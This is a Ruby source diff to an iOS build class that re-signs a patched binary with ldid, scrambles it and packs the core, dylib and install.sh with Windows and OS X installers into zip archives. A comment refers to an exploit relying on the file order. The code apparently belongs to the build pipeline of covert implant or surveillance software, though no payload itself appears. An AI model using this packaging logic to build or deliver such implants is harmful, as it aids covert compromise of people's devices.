@@ -32,7 +32,9 @@ class BuildIOS < Build
     super
 
     # realign the memory hashes after the binary patching
-    CrossPlatform.exec path('ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('')}
+    CrossPlatform.exec path('build/ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('build')}
+
+    @outputs = ['codesign_allocate', 'core', 'dylib', 'ent.plist', 'install.sh', 'ldid']
   end
 
   def scramble
@@ -103,23 +105,8 @@ class BuildIOS < Build
       FileUtils.cp path(output), path("ios/#{File.basename(output)}")
     end
 
-    # installer for windows
-    Zip::ZipFile.open(path('win.zip')) do |z|
-      z.each do |f|
-        z.extract(f, path("win/#{f.name}"))
-      end
-    end
-
-    # installer for osx
-    Zip::ZipFile.open(path('osx.zip')) do |z|
-      z.each do |f|
-        z.extract(f, path("osx/#{f.name}"))
-      end
-    end
-
     # put it as the first file of the outputs, since the exploit relies on this
     @outputs.insert(0, 'output.zip')
-
   end
 
   def pack(params)
@@ -132,14 +119,13 @@ class BuildIOS < Build
       Dir[path('win/**')].each do |file|
         z.file.open("win/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
       end
-      #Dir[path('osx/**')].each do |file|
-      #  z.file.open("osx/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
-      #end
+      Dir[path('osx/**')].each do |file|
+        z.file.open("osx/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+      end
     end
 
     # we already have this file from the previous step
     @outputs = ['installer.zip']
-
   end
 
   def unique(core)
